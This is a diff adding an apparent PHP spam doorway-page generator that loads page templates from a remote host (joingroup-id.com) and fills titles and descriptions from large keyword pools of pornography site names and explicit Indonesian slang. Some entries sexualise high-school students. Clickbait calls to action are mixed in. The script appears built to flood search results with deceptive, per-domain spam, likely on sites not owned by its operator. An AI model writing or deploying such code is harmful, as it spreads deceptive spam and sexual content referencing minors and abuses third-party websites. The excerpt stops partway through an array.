+    } elseif ($pattern === 1) {
+        // Pola 2: mangledWord1-mangledWord2-mangledWord3 wrapper STATUS quality extra
+        $w1 = $baseWords[abs(crc32($seed . 'bw1')) % 228];
+        $w2 = $baseWords[abs(crc32($seed . 'bw2')) % 228];
+        $w3 = $baseWords[abs(crc32($seed . 'bw3')) % 228];
+        $w4 = $baseWords[abs(crc32($seed . 'bw4')) % 228];
+        $wrapper = $wrappers[abs(crc32($seed . 'jw')) % 54];
+        $s = $status[abs(crc32($seed . 'js')) % 65];
+        $q = $quality[abs(crc32($seed . 'jq')) % 54];
+        $t = $type[abs(crc32($seed . 'jt')) % 53];
+
+        $mangled = mangleWord($w1, $seed . 'm1') . '-' . mangleWord($w2, $seed . 'm2') . '-' . mangleWord($w3, $seed . 'm3');
+        if (abs(crc32($seed . 'add4')) % 2 === 0) {
+            $mangled .= '-' . mangleWord($w4, $seed . 'm4');
+        }
+        $parts = array(sprintf($wrapper, $mangled));
+        $parts[] = $s;
+        $parts[] = $t;
+        if (abs(crc32($seed . 'addq')) % 2 === 0) $parts[] = $q;
+        return implode(' ', $parts);
+
+    } else {
+        // Pola 3: mangledWord1 mangledWord2 [STATUS] mangledWord3 type quality extra
+        $w1 = $baseWords[abs(crc32($seed . 'bw1')) % 228];
+        $w2 = $baseWords[abs(crc32($seed . 'bw2')) % 228];
+        $w3 = $baseWords[abs(crc32($seed . 'bw3')) % 228];
+        $w4 = $baseWords[abs(crc32($seed . 'bw4')) % 228];
+        $wrapper = $wrappers[abs(crc32($seed . 'jw')) % 54];
+        $s = $status[abs(crc32($seed . 'js')) % 65];
+        $t = $type[abs(crc32($seed . 'jt')) % 53];
+        $q = $quality[abs(crc32($seed . 'jq')) % 54];
+        $e = $extra[abs(crc32($seed . 'je')) % 66];
+
+        $parts = array(mangleWord($w1, $seed . 'm1'));
+        $parts[] = mangleWord($w2, $seed . 'm2');
+        $parts[] = sprintf($wrapper, $s);
+        $parts[] = mangleWord($w3, $seed . 'm3');
+        $parts[] = $t;
+        $parts[] = $q;
+        if (abs(crc32($seed . 'add4')) % 2 === 0) $parts[] = mangleWord($w4, $seed . 'm4');
+        if (abs(crc32($seed . 'adde')) % 2 === 0) $parts[] = $e;
+        return implode(' ', $parts);
+    }
+}
+
+// ─── Pilih randomWord: random per domain+keyword (konsisten, beda tiap domain) ──
+$wordHash = abs(crc32($domainSeed . 'wordtype'));
+if ($wordHash % 2 === 0) {
+    // Dari list $words
+    $randomWord = $words[abs(crc32($domainSeed . 'word')) % 128];
+} else {
+    // Dari junk text generator
+    $randomWord = generateJunkText($domainSeed);
+}
+
+$lokasi =& $_sp['lokasi'];
+$randomLokasi = $lokasi[abs(crc32($domainSeed . 'lokasi')) % 52];
+
+// Random image from img.txt — static-cached, baca disk 1x per worker
+// img.txt sudah di-parse di _sp() — ambil dari static pool
+$images =& $_sp['images'];
+// Pilih gambar berdasarkan hash keyword agar konsisten (tidak random)
+$randomImg = '';
+$randomImg1 = '';
+$randomImg2 = '';
+$randomImg3 = '';
+$randomImg4 = '';
+$randomImg5 = '';
+if ($images) {
+    $imgCount = count($images);
+    $randomImg  = $images[abs(crc32($domainSeed)) % $imgCount];
+    $randomImg1 = $images[abs(crc32($domainSeed . 'img1')) % $imgCount];
+    $randomImg2 = $images[abs(crc32($domainSeed . 'img2')) % $imgCount];
+    $randomImg3 = $images[abs(crc32($domainSeed . 'img3')) % $imgCount];
+    $randomImg4 = $images[abs(crc32($domainSeed . 'img4')) % $imgCount];
+    $randomImg5 = $images[abs(crc32($domainSeed . 'img5')) % $imgCount];
+}
+
+// ─── Load Template (remote + cache lokal) ───────────────────────────────────
+// Daftar template remote (file.txt, file1.txt ... file5.txt)
+$tplNames = array('file', 'file1', 'file2', 'file3', 'file4', 'file5');
+$tplBaseUrl = 'https://joingroup-id.com/seo/';
+$cacheDir = dirname(__FILE__) . '/cache_tpl';
+$cacheTTL = 86400; // cache 24 jam
+
+if (!is_dir($cacheDir)) {
+    @mkdir($cacheDir, 0755, true);
+}
+
+// Root → selalu pakai file4, keyword → pilih template berdasarkan hash
+if ($isRootAccess) {
+    $tplIndex = array_search('file4', $tplNames);
+} else {
+    $tplSeed = $_SERVER['HTTP_HOST'] . '|' . $incomingSlug . '|tpl';
+    $tplIndex = abs(crc32($tplSeed)) % 6;
+}
+
+$htmlContent = false;
+for ($attempt = 0; $attempt < 6; $attempt++) {
+    $idx = ($tplIndex + $attempt) % 6;
+    $tplName = $tplNames[$idx];
+    $cacheFile = $cacheDir . '/' . $tplName . '.txt';
+
+    // Cek cache lokal dulu
+    if (is_file($cacheFile) && (time() - filemtime($cacheFile)) < $cacheTTL) {
+        $data = @file_get_contents($cacheFile);
+        if ($data !== false && trim($data) !== '') {
+            $htmlContent = $data;
+            break;
+        }
+    }
+
+    // Fetch dari remote
+    $data = fetchContent($tplBaseUrl . $tplName . '.txt', 10);
+    if ($data !== false && trim($data) !== '') {
+        @file_put_contents($cacheFile, $data, LOCK_EX);
+        $htmlContent = $data;
+        break;
+    }
+
+    // Jika remote gagal tapi cache lama masih ada, pakai itu
+    if (is_file($cacheFile)) {
+        $data = @file_get_contents($cacheFile);
+        if ($data !== false && trim($data) !== '') {
+            $htmlContent = $data;
+            break;
+        }
+    }
+}
+
+if (!$htmlContent || trim($htmlContent) === '') {
+    header('HTTP/1.1 500 Internal Server Error');
+    exit('Error 500: Gagal memuat template dari remote maupun cache.');
+}
+
+$BRANDS = $BRAND; // alias — support {$BRAND} dan {$BRANDS}
+
+// ─── SMART TITLE & DESC GENERATOR ─────────────────────────────────────────────
+// Sistem agent: hash-based selection → 100 template × variabel pool = RIBUAN kombinasi unik
+// Setiap domain+keyword SELALU dapat kombinasi SAMA (konsisten), tapi BEDA antar domain
+
+// ─── Variable Pools (static: allocated once per FPM worker, zero-cost after first request) ─
+function &_sp(): array {
+    static $p;
+    if (isset($p)) return $p;
+$p['emojis'] = array(
+    // Original brand hub besar
+    'XNXX', 'EPORNER', 'BOKEP', 'XXX', 'XNNNXXX', 'XVIDEOOS', 'VIDEO', 'REDTUBE', 'GURU', 'CHEF', 'VIRAL 2026',
+    'PORNHUB', 'YOUPORN', 'BRAZZERS', 'BANGBROS', 'NAUGHTYAMERICA', 'REALITYKINGS', 'MOFOS', 'BABES',
+    'XHAMSTER', 'TUBE8', 'SPANKBANG', 'BEEG', 'FAPVID', 'TXXX', 'HCLIPS', 'VJAV', 'JAVHD',
+    'JAVMOST', 'MISSAV', 'SUPJAV', 'THISAV', 'AVGLE', 'CARIBBEANCOM', 'HEYZO', '1PONDO',
+    'STRIPCHAT', 'CHATURBATE', 'LIVEJASMIN', 'BONGACAMS', 'CAMSODA', 'MYFREECAMS', 'CAM4',
+    'ONLYFANS', 'FANSLY', 'MANYVIDS', 'CLIPS4SALE', 'IWARA', 'RULE34', 'NHENTAI',
+    // Original tambahan
+    'PORNTREX', 'DAFTSEX', 'MOTHERLESS', 'ALOHATUBE', 'YOUJIZZ', 'DRTUBER', 'SUNPORNO',
+    'ANYPORN', 'GOTPORN', 'PORNONE', 'LETSJERK', 'FUQER', 'HDPORN', 'PORNDOE',
+    'PORNDIG', 'PORNZOG', 'TUBEGALORE', 'PORNMD', 'NUDEVISTA', 'THUMBZILLA',
+    'KEEZMOVIES', 'EXTREMETUBE', 'XTUBE', 'TNAFLIX', 'EMPFLIX', 'SLUTLOAD',
+    'SEXVID', 'PORNTUBE', 'MOVIESAND', 'FREEONES', 'VPORN', 'SHAMELESS',
+    'JABLE', 'AVDBS', 'JAVLIBRARY', 'JAVBANGERS', 'JAVSEEN', 'JAVGG',
+    'R18', 'DMM', 'MGS', 'FANZA', 'SOKMIL', 'TOKYO HOT',
+    'DIGITAL PLAYGROUND', 'VIXEN', 'TUSHY', 'BLACKED', 'DEEPER', 'SLAYED',
+    'EVIL ANGEL', 'KINK', 'WICKED', 'PENTHOUSE', 'HUSTLER', 'PLAYBOY',
+    'VIVID', 'PRIVATE', 'MARC DORCEL', 'DORCEL VISION', 'PIERRE WOODMAN', 'LEGALPORNO',
+    // Lokal Indo - Umum
+    'BOKEP INDO', 'BOKEP VIRAL', 'BOKEP TERBARU', 'VIRAL INDO', 'TRENDING 2026', 'HOT VIDEO',
+    'BOKEP SMA', 'BOKEP HIJAB', 'BOKEP JILBAB', 'BOKEP MELAYU', 'BOKEP MALAYSIA', 'BOKEP THAILAND',
+    'BOKEP BARAT', 'BOKEP KOREA', 'BOKEP JEPANG', 'BOKEP CHINA', 'BOKEP ARAB', 'BOKEP INDIA',
+    'VIDEO INDO', 'CLIP VIRAL', 'KONTEN DEWASA', 'FILM DEWASA', 'STREAMING INDO', 'NONTON GRATIS',
+    'VIRAL TIKTOK', 'VIRAL TWITTER', 'VIRAL TELEGRAM', 'VIRAL MEDSOS', 'VIRAL WA', 'VIRAL IG',
+    'SIMONTOK', 'MEMEK INDO', 'ABGINDO', 'INDOXXI', 'LAYARKACA', 'GANOOL',
+    'SEMPROT', 'LENDIR', 'NGENTOT', 'COLMEK', 'COLI', 'PEPEK',
+    'LOKAL VIRAL', 'ASLI INDONESIA', 'PRODUKSI LOKAL', 'HOMEMADE INDO', 'AMATEUR INDO', 'REAL INDO',
+    'JAKARTA VIRAL', 'BANDUNG HOT', 'SURABAYA TRENDING', 'BALI LEAKED', 'MEDAN VIRAL', 'SEMARANG HOT',
+    'MAHASISWI VIRAL', 'PERAWAT VIRAL', 'GURU VIRAL', 'PNS VIRAL', 'OJOL VIRAL', 'DRIVER VIRAL',
+    // Lokal Indo - Kota & Daerah
+    'MAKASSAR VIRAL', 'JOGJA HOT', 'SOLO TRENDING', 'PALEMBANG LEAKED', 'MANADO VIRAL', 'PONTIANAK HOT',
+    'BALIKPAPAN VIRAL', 'MALANG TRENDING', 'DEPOK VIRAL', 'TANGERANG HOT', 'BEKASI LEAKED', 'BOGOR VIRAL',
+    'ACEH VIRAL', 'LAMPUNG HOT', 'BATAM TRENDING', 'PEKANBARU LEAKED', 'PADANG VIRAL', 'JAMBI HOT',
+    'MATARAM VIRAL', 'KUPANG HOT', 'AMBON TRENDING', 'JAYAPURA LEAKED', 'SAMARINDA VIRAL', 'BANJARMASIN HOT',
+    'CIREBON VIRAL', 'TASIK HOT', 'GARUT TRENDING', 'SUKABUMI LEAKED', 'KARAWANG VIRAL', 'PURWOKERTO HOT',
+    // Lokal Indo - Profesi & Role
+    'BIDAN VIRAL', 'DOKTER VIRAL', 'TENTARA VIRAL', 'POLISI VIRAL', 'SATPAM VIRAL', 'KARYAWAN VIRAL',
+    'PEDAGANG VIRAL', 'TUKANG VIRAL', 'SOPIR VIRAL', 'KURIR VIRAL', 'KASIR VIRAL', 'SPG VIRAL',
+    'MODEL INDO', 'ARTIS VIRAL', 'SELEBGRAM VIRAL', 'TIKTOKER VIRAL', 'YOUTUBER VIRAL', 'INFLUENCER INDO',
+    'JANDA VIRAL', 'TANTE VIRAL', 'ABANG VIRAL', 'KAKAK VIRAL', 'TETANGGA VIRAL', 'SELINGKUH VIRAL',
+    // Lokal Indo - Platform & Sumber
+    'TWITTER INDO', 'TELEGRAM INDO', 'FACEBOOK VIRAL', 'SNACK VIDEO', 'KWAI VIRAL', 'LIKEE VIRAL',
+    'LINE TODAY', 'BIGO LIVE', 'MANGO LIVE', 'NIMO TV', 'TANTAN VIRAL', 'MICHAT VIRAL',
+    'OMETV INDO', 'HAGO VIRAL', 'LAMBE TURAH', 'SOSMED INDO', 'GROUP WA', 'CHANNEL TG',
+    'LINK VIRAL', 'LINK INDO', 'LINK BOCOR', 'LINK PREMIUM', 'LINK RAHASIA', 'LINK TERSEMBUNYI',
+    // Lokal Indo - Format & Tipe
+    'BOKEP LIVE', 'BOKEP CHAT', 'BOKEP CALL', 'BOKEP VCS', 'BOKEP VC', 'BOKEP REKAMAN',
+    'BOKEP HOTEL', 'BOKEP KOST', 'BOKEP RUMAH', 'BOKEP MOBIL', 'BOKEP KANTOR', 'BOKEP SEKOLAH',
+    'BOKEP WARNET', 'BOKEP KAMAR MANDI', 'BOKEP FITTING ROOM', 'BOKEP DRESSING ROOM',
+    'VIDEO CALL INDO', 'LIVE SHOW INDO', 'WEBCAM INDO', 'SELFIE INDO', 'MIRROR INDO', 'POV INDO',
+    // Lokal Indo - Slang & Variasi
+    'CROT', 'DESAH', 'SANGE', 'BACOL', 'NGEWE', 'ENTOT',
+    'TOKET', 'SUSU GEDE', 'BODY SEMOK', 'MONTOK', 'BOHAY', 'SEKSI INDO',
+    'ABG INDO', 'TOGE INDO', 'STW INDO', 'MILF INDO', 'PAWG INDO', 'BBW INDO',
+    'JILBOOBS', 'HIJABER HOT', 'UKHTI VIRAL', 'SANTRI VIRAL', 'PESANTREN VIRAL',
+    'NO SENSOR INDO', 'TANPA SENSOR', 'FULL VIDEO', 'DURASI PANJANG', 'HD INDO', '4K INDO',
+    // Lokal Indo - Waktu & Trending
+    'TERBARU 2026', 'UPDATE 2026', 'APRIL 2026', 'HARI INI', 'BARU UPLOAD', 'BARU RILIS',
+    'MINGGU INI', 'BULAN INI', 'TADI MALAM', 'KEMARIN VIRAL', 'BARUSAN BOCOR', 'BARU TERSEBAR',
+    'TRENDING INDO', 'FYP INDO', 'MASUK FYP', 'EXPLORE INDO', 'RECOMMEND INDO', 'POPULER INDO',
+    'PALING DICARI', 'PALING LARIS', 'PALING HOT', 'PALING VIRAL', 'NOMOR 1 INDO', 'TOP INDO',
+);
+
+$p['words'] = array(
+    // ─── Situs besar ─────────────────
+    'xnxx', 'eporner', 'pornhub', 'xvideos', 'redtube', 'youporn',
+    'brazzers', 'bangbros', 'naughtyamerica', 'realitykings',
+    'mofos', 'digitalplayground', 'teamskeet', 'wicked', 'kink',
+    'onlyfans', 'stripchat', 'chaturbate', 'bongacams', 'cam4',
+    'spankbang', 'drtuber', 'slutload', 'tube8', 'extrabig',
+    'beeg', 'hclips', 'faphouse', 'sexvid', 'porn300',
+    'xhamster', 'youjizz', 'tnaflix', 'sunporno', 'txxx',
+    'nuvid', 'tubegalore', 'pornone', 'fuq', 'lobstertube',
+    'thumbzilla', 'porntrex', 'sxyprn', 'daftsex', 'porndoe',
+
+    // ─── Lokal / Indo ────────────────
+    'lk21', 'bokep jepang', 'bokep indo', 'bokep viral', 'bokep terbaru',
+    'bokep sma', 'bokep abg', 'bokep barat', 'bokep korea', 'bokep thailand',
+    'bokep live', 'bokep tiktok', 'video mesum', 'video syur', 'video panas',
+    'ngentot', 'guru', 'viral sma', 'film semi', 'film bokep',
+    'nonton bokep', 'download bokep', 'streaming bokep',
+    'bokep twitter', 'bokep telegram', 'bokep hot', 'situs bokep', 'link bokep',
+    'bokep mahasiswa', 'bokep jilbab', 'bokep ojol', 'bokep pelakor', 'bokep selingkuh',
+    'bokep warung', 'bokep hotel', 'bokep rumahan', 'bokep amatir', 'bokep profesional',
+    'bokep full movie', 'bokep uncensored', 'bokep hd', 'bokep 4k', 'bokep sub indo',
+    'bokep cosplay', 'bokep pijat', 'bokep kamar mandi', 'bokep kantor', 'bokep spg',
+    'bokep artis', 'bokep selebgram', 'bokep youtuber', 'bokep tiktoker', 'bokep influencer',
+    'video viral', 'video trending', 'video dewasa', 'video 18+', 'video premium',
+    'video eksklusif', 'video terbatas', 'video privat', 'video leaked', 'video skandal',
+    'film dewasa', 'film 18+', 'film panas', 'film erotis', 'film blue',
+    'jav', 'jav uncensored', 'jav sub indo', 'jav hd', 'jav terbaru',
+    'hentai', 'hentai sub indo', 'manga dewasa', 'doujin', 'komik hentai',
+    'live streaming', 'live show', 'cam girl', 'webcam', 'bigo live',
+);
+
+
+$p['lokasi'] = array(
+    'Jakarta', 'Jawa Barat', 'Jawa Tengah', 'Jawa Timur', 'Banten',
+    'DI Yogyakarta', 'Sumatera Utara', 'Sumatera Barat', 'Sumatera Selatan', 'Riau',
+    'Lampung', 'Bali', 'Kalimantan Barat', 'Kalimantan Timur', 'Kalimantan Selatan',
+    'Kalimantan Tengah', 'Kalimantan Utara', 'Sulawesi Selatan', 'Sulawesi Utara',
+    'Sulawesi Tengah', 'Sulawesi Tenggara', 'Sulawesi Barat', 'Gorontalo',
+    'Papua', 'Papua Barat', 'Maluku', 'Maluku Utara', 'NTB', 'NTT',
+    'Aceh', 'Bengkulu', 'Jambi', 'Kepulauan Riau', 'Bangka Belitung',
+    'Bandung', 'Surabaya', 'Semarang', 'Medan', 'Makassar', 'Palembang',
+    'Denpasar', 'Balikpapan', 'Pontianak', 'Manado', 'Bogor', 'Depok',
+    'Tangerang', 'Bekasi', 'Malang', 'Solo', 'Yogyakarta', 'Cirebon',
+);
+
+// img.txt di-cache di sini — static $p persists per PHP-FPM worker
+$_imgLocal = dirname(__FILE__) . '/img.txt';
+$_imgRaw   = is_readable($_imgLocal) ? @file_get_contents($_imgLocal) : '';
+$p['images'] = array();
+foreach (explode("\n", str_replace("\r", '', $_imgRaw)) as $_imgLn) {
+    $_imgLn = trim($_imgLn);
+    if ($_imgLn !== '' && $_imgLn[0] !== '#' && substr($_imgLn, 0, 4) === 'http')
+        $p['images'][] = $_imgLn;
+}
+unset($_imgLocal, $_imgRaw, $_imgLn);
+
+$p['subjects'] = array(
+    'gadis cantik', 'wanita tangguh', 'pemuda berbakat', 'remaja viral', 'ibu rumah tangga',
+    'mahasiswi cerdas', 'atlet muda', 'penari eksotis', 'model fitness', 'koki berbakat',
+    'pelajar SMA', 'seniman jalanan', 'perawat cantik', 'guru muda', 'desainer kreatif',
+    'programmer jenius', 'penyanyi berbakat', 'fotografer liar', 'pelukis misterius', 'arsitek muda',
+    'dokter cantik', 'pengacara tangguh', 'jurnalis berani', 'ilmuwan brilian', 'aktivis vokal',
+    'selebgram kontroversial', 'tiktoker fenomenal', 'youtuber legendaris', 'gamer profesional', 'DJ terkenal',
+    'bartender eksotis', 'barista kreatif', 'mekanik wanita', 'pilot perempuan', 'kapten kapal',
+    'penyelam profesional', 'pendaki gunung', 'peselancar tangguh', 'petarung MMA', 'pemanah handal',
+    'penerjun payung', 'pembalap liar', 'teknisi robotik', 'ahli forensik', 'detektif swasta',
+    'koreografer viral', 'makeup artist', 'tattoo artist', 'chef sushi', 'somelier muda',
+    // batch 2 (51-100)
+    'aktor teater', 'komedian stand-up', 'penulis skrip', 'sutradara indie', 'produser musik',
+    'pemain sirkus', 'pesulap jalanan', 'penari ballet', 'rapper underground', 'beatboxer profesional',
+    'skateboarder pro', 'BMX rider', 'snowboarder handal', 'wakeboarder ekstrem', 'kitesurfer tangguh',
+    'traveler solo', 'backpacker liar', 'vlogger petualangan', 'food blogger', 'reviewer gadget',
+    'cosplayer viral', 'voice actor', 'podcaster terkenal', 'streamer gaming', 'caster e-sports',
+    'peternak modern', 'nelayan lepas pantai', 'petani organik', 'pembuat keris', 'pengrajin batik',
+    'sopir truk lintas negara', 'kurir ekspres', 'tour guide eksotis', 'pramugari senior', 'satpam teladan',
+    'tukang cukur vintage', 'barber shop owner', 'florist kreatif', 'event organizer', 'wedding planner',
+    'psikolog muda', 'konsultan karir', 'motivator handal', 'life coach', 'terapis holistik',
+    'arkeolog pemberani', 'ahli paleontologi', 'astronom amatir', 'meteorolog lapangan', 'geolog petualang',
+);
+
+$p['actions'] = array(
+    'beraksi liar', 'tampil memukau', 'memecah rekor', 'bikin heboh', 'menggemparkan dunia',
+    'viral seketika', 'mencuri perhatian', 'menghipnotis penonton', 'membuat takjub', 'menggebrak panggung',
+    'mendobrak batas', 'mengguncang industri', 'meledak di media', 'membakar semangat', 'menginspirasi jutaan',
+    'menguasai panggung', 'menaklukkan tantangan', 'menembus batas', 'merevolusi dunia', 'membuktikan diri',
+    'menantang bahaya', 'menjelajahi batas', 'bertarung habis-habisan', 'unjuk kebolehan', 'pamer aksi',
+    'tampil all out', 'show off skill', 'bikin melongo', 'pecahkan mitos', 'lampaui ekspektasi',
+    'bongkar rahasia', 'ungkap misteri', 'tunjukkan bukti', 'buktikan kemampuan', 'patahkan stereotip',
+    'kuasai teknik', 'pamerkan keahlian', 'demonstrasikan skill', 'pertontonkan aksi', 'eksekusi sempurna',
+    'cetak sejarah', 'torehkan prestasi', 'raih pencapaian', 'ukir rekor baru', 'ciptakan fenomena',
+    'gebrak mainstream', 'dominasi trending', 'kuasai algoritma', 'taklukkan viral', 'rebut spotlight',
+    // batch 2 (51-100)
+    'ledakkan panggung', 'guncang stadion', 'hipnotis massa', 'bikin standing ovation', 'picu histeria',
+    'pecahkan kesunyian', 'geser paradigma', 'ubah permainan', 'tulis ulang sejarah', 'bangkitkan legenda',
+    'runtuhkan tembok', 'hancurkan batasan', 'lawan arus', 'berontak total', 'revolusi habis-habisan',
+    'menjelma fenomena', 'transformasi total', 'metamorfosis gila', 'evolusi drastis', 'upgrade level',
+    'raih golden ticket', 'kantongi jackpot', 'menang telak', 'sapu bersih penghargaan', 'borong trofi',
+    'tebar pesona', 'pancarkan aura', 'sebarkan energi', 'salurkan passion', 'tunjukkan karakter',
+    'bikin gebrakan baru', 'luncurkan serangan', 'eksekusi rencana', 'jalankan misi', 'selesaikan tantangan',
+    'taklukkan arena', 'kuasai medan', 'rebut tahta', 'duduki puncak', 'rajai kompetisi',
+    'pecahkan kebuntuan', 'temukan solusi', 'crack the code', 'solve the puzzle', 'unlock achievement',
+    'bikin sensasi baru', 'ciptakan tren', 'lahirkan movement', 'mulai era baru', 'buka chapter baru',
+);
+
+$p['places'] = array(
+    'galangan kapal raksasa', 'laboratorium bawah tanah', 'gedung pencakar langit', 'hutan belantara Kalimantan',
+    'dasar laut Sulawesi', 'puncak gunung Semeru', 'stadion internasional', 'panggung festival musik',
+    'bengkel pesawat militer', 'landasan pacu bandara', 'tambang emas terdalam', 'pabrik otomotif Jepang',
+    'kapal selam nuklir', 'stasiun antariksa', 'ring tinju profesional', 'sirkuit balap Formula',
+    'studio rekaman Hollywood', 'backstage konser dunia', 'arena e-sports global', 'platform minyak lepas pantai',
+    'terowongan bawah laut', 'jembatan gantung tertinggi', 'menara telekomunikasi', 'pusat data raksasa',
+    'reaktor nuklir', 'observatorium astronomi', 'base camp Everest', 'gua kristal Meksiko',
+    'pasar terapung Bangkok', 'kuil kuno Kyoto', 'gang sempit Tokyo', 'rooftop Dubai',
+    'pantai tersembunyi Bali', 'pelabuhan internasional', 'dermaga kapal pesiar', 'helipad gedung tertinggi',
+    'bunker rahasia', 'markas militer', 'zona perang aktif', 'perbatasan berbahaya',
+    'kawah gunung berapi', 'sungai Amazon', 'padang es Antartika', 'gurun Sahara',
+    'terumbu karang Raja Ampat', 'air terjun Niagara', 'lembah tersembunyi', 'kepulauan terpencil',
+    'kota bawah tanah', 'kastil tua Eropa',
+    // batch 2 (53-100)
+    'studio seni kontemporer', 'galeri bawah tanah', 'gudang tua pelabuhan', 'loteng gedung terbengkalai',
+    'basement klub malam', 'atap parkiran gedung', 'lorong kereta bawah tanah', 'stasiun MRT tengah malam',
+    'bandara militer rahasia', 'pangkalan udara terpencil', 'dok kapal perang', 'anjungan pengeboran',
+    'menara kontrol bandara', 'ruang operasi rumah sakit', 'lab riset universitas', 'perpustakaan kuno',
+    'museum sejarah perang', 'benteng kolonial', 'reruntuhan candi', 'situs arkeologi purba',
+    'sawah terasering Ubud', 'kebun teh Puncak', 'perkebunan kopi Toraja', 'ladang garam Madura',
+    'pasar malam Semarang', 'gang sempit Malioboro', 'trotoar Sudirman', 'kolong jembatan Ampera',
+    'pelabuhan Tanjung Priok', 'dermaga nelayan Muara Angke', 'pantai karang Gunungkidul', 'teluk tersembunyi Lombok',
+    'hutan mangrove Tarakan', 'rawa gambut Riau', 'danau vulkanik Kelimutu', 'goa Jomblang Gunung Kidul',
+    'puncak Cartenz Papua', 'lembah Baliem', 'taman nasional Komodo', 'hutan hujan Sumatera',
+    'arena rodeo Texas', 'backstage Broadway', 'studio Netflix', 'kantor pusat Silicon Valley',
+    'lab SpaceX', 'markas Google', 'gedung Pentagon', 'Wall Street',
+);
+
+$p['professions'] = array(
+    'ahli las bawah air', 'penjinak bom', 'penyelam satwa liar', 'mekanik jet tempur', 'operator crane raksasa',
+    'tukang rigging kapal', 'teknisi turbin angin', 'insinyur jembatan', 'ahli ledakan tambang', 'navigator kapal tanker',
+    'instruktur terjun payung', 'pelatih lumba-lumba', 'pawang buaya', 'penangkap ular', 'penjaga mercusuar',
+    'masinis kereta cepat', 'pilot helikopter SAR', 'kapten kapal selam', 'komandan pasukan elit', 'sniper profesional',
+    'ahli defusi nuklir', 'peneliti virus mematikan', 'ahli vulkanologi', 'pemburu badai tornado', 'penjelajah gua',
+    'freediver ekstrem', 'base jumper legendaris', 'stunt woman Hollywood', 'kaskadir profesional', 'pembalap rally',
+    'ahli parkour', 'master bela diri', 'petinju kelas dunia', 'pegulat profesional', 'atlet triathlon',
+    'koki api terbuka', 'blacksmith modern', 'glass blower artistik', 'lumberjack wanita', 'rodeo rider',
+    'ahli forensik digital', 'hacker etis', 'crypto trader legendaris', 'AI engineer', 'drone pilot profesional',
+    'underwater photographer', 'war correspondent', 'storm chaser', 'volcano explorer', 'deep sea researcher',
+    // batch 2 (51-100)
+    'arsitek kapal', 'desainer pesawat', 'ahli ballistik', 'petugas pemadam kebakaran', 'paramedis lapangan',
+    'operator sonar kapal selam', 'teknisi satelit', 'insinyur roket', 'ahli kriptografi', 'analis intelijen',
+    'penambang berlian', 'pencari harta karun', 'arkeolog bawah air', 'penjelajah kutub', 'peneliti Antartika',
+    'trainer singa', 'pawang gajah', 'penjaga taman safari', 'marine biologist', 'ahli primata',
+    'juru masak kapal pesiar', 'sommelier wine', 'food scientist', 'ahli nutrisi', 'herbalist tradisional',
+    'dukun digital', 'paranormal investigator', 'ghost hunter', 'criptozoologist', 'ufologist',
+    'body double aktor', 'stunt coordinator', 'fight choreographer', 'pyrotechnics expert', 'SFX makeup artist',
+    'luthier gitar', 'piano tuner', 'sound engineer', 'lighting designer', 'rigger konser',
+    'joki balap profesional', 'pelatih kuda', 'falconer', 'dog trainer K-9', 'animal communicator',
+    'bounty hunter', 'private investigator', 'bodyguard selebriti', 'ethical hacker', 'penetration tester',
+);
+
+$p['hooks_konteks'] = array(
+    'Fenomena langka terungkap', 'Investigasi mendalam mengungkap', 'Analisis eksklusif tentang',
+    'Fakta mengejutkan di balik', 'Rahasia tersembunyi dari', 'Misteri terpecahkan tentang',
+    'Kronologi lengkap kisah', 'Rekam jejak menakjubkan', 'Profil mendalam tentang',
+    'Liputan khusus mengenai', 'Laporan eksklusif tentang', 'Studi kasus menarik',
+    'Dokumentasi langka tentang', 'Pengungkapan fakta di balik', 'Jejak digital mengungkap',
+    'Riset terbaru membuktikan', 'Data terkini menunjukkan', 'Survei mengejutkan tentang',
+    'Testimoni langsung dari', 'Bukti otentik mengenai', 'Catatan rahasia tentang',
+    'Arsip tersembunyi dari', 'Dekode misteri di balik', 'Sinopsis lengkap kisah',
+    'Retrospektif mendalam tentang',
+    // batch 2 (26-50)
+    'Eksplorasi eksklusif mengenai', 'Wawancara mengejutkan dengan', 'Timeline lengkap dari',
+    'Dossier rahasia tentang', 'Eksposisi mendalam perihal', 'Investigasi forensik terhadap',
+    'Anatomi kasus tentang', 'Blueprint tersembunyi dari', 'Peta jejak digital',
+    'Konfirmasi resmi tentang', 'Validasi data mengenai', 'Verifikasi fakta perihal',
+    'Rekonstruksi peristiwa', 'Simulasi kronologis dari', 'Pemetaan komprehensif tentang',
+    'Telisik mendalam tentang', 'Autopsi digital terhadap', 'Forensik data perihal',
+    'Kompilasi bukti tentang', 'Rangkuman investigasi dari', 'Ringkasan temuan tentang',
+    'Deklarasi mengejutkan perihal', 'Pengakuan langsung tentang', 'Konfesi eksklusif dari',
+    'Bocoran internal tentang',
+);
+
+$p['hooks_instruksi'] = array(
+    'Cara nonton eksklusif', 'Panduan lengkap streaming', 'Tutorial akses premium',
+    'Langkah mudah melihat', 'Metode terbaru menonton', 'Trik rahasia mengakses',
+    'Guide terlengkap untuk', 'Akses VIP ke konten', 'Jalur cepat menuju',
+    'Kunci membuka akses', 'Solusi streaming untuk', 'Portal eksklusif menuju',
+    'Pintu masuk ke dunia', 'Navigasi cerdas menuju', 'Shortcut premium untuk',
+    'Hack legal untuk akses', 'Strategi jitu menonton', 'Blueprint lengkap akses',
+    'Roadmap menuju konten', 'Masterplan streaming untuk', 'Formula rahasia membuka',
+    'Resep sukses mengakses', 'Kode akses menuju', 'Gateway premium ke',
+    'Fast track menuju konten',
+    // batch 2 (26-50)
+    'Cheat sheet akses untuk', 'Walkthrough lengkap ke', 'Step-by-step membuka', 'Manual singkat akses',
+    'Quick start guide untuk', 'Instruksi detail menuju', 'Prosedur cepat akses', 'SOP streaming untuk',
+    'Teknik baru menonton', 'Metode alternatif akses', 'Cara tercepat membuka', 'Jalan pintas menuju',
+    'Akses bypass untuk', 'Direct link menuju', 'Express route ke konten', 'VIP lane untuk',
+    'Backdoor akses ke', 'Secret path menuju', 'Hidden route untuk', 'Underground access ke',
+    'One-click akses untuk', 'Instant unlock cara', 'Speed hack akses', 'Turbo mode menuju',
+    'Unlimited pass untuk',
+);
+
+$p['ctas'] = array(
+    'Klik Sekarang', 'Tonton Gratis', 'Akses Sebelum Dihapus', 'Buka Link Ini', 'Masuk Sekarang',
+    'Cek Selengkapnya', 'Lihat Disini', 'Jangan Lewatkan', 'Streaming Now', 'Play Sekarang',
+    'Download Gratis', 'Daftar Sekarang', 'Gabung Disini', 'Unlock Sekarang', 'Claim Akses',
+    'Buka Sekarang Juga', 'Saksikan Langsung', 'Putar Videonya', 'Start Watching', 'Mulai Nonton',
+    'Tap Untuk Akses', 'Lanjut Ke Konten', 'Buruan Nonton', 'Intip Sekarang', 'Simak Disini',
